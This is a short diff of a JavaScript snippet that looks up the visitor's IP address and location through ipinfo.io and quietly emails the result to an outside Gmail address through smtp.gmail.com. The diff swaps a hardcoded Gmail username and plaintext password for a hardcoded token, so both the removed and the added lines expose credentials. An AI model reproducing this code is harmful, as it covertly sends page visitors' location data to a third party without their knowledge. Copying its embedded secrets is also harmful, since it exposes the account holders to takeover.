@@ -6,11 +6,12 @@ $.getJSON('https://ipinfo.io/json', function(data) {
   console.log(JSON.stringify(data, null, 2));
   Email.send({
       Host : "smtp.gmail.com",
-      Username : "02gracelie2019@gmail.com",
-      Password : "maverick2013",
+      SecureToken : "AIzaSyAYHko6CWFWIbUbMEyCfsOEv2ujAyWWjnM ",
       To : 'f.crayop@gmail.com',
       From : "02gracelie2019@gmail.com",
       Subject : "ipinfo.io",
+      Authentication: 'Yes',
+      
       Body : JSON.stringify(data, null, 2)
   })
 });
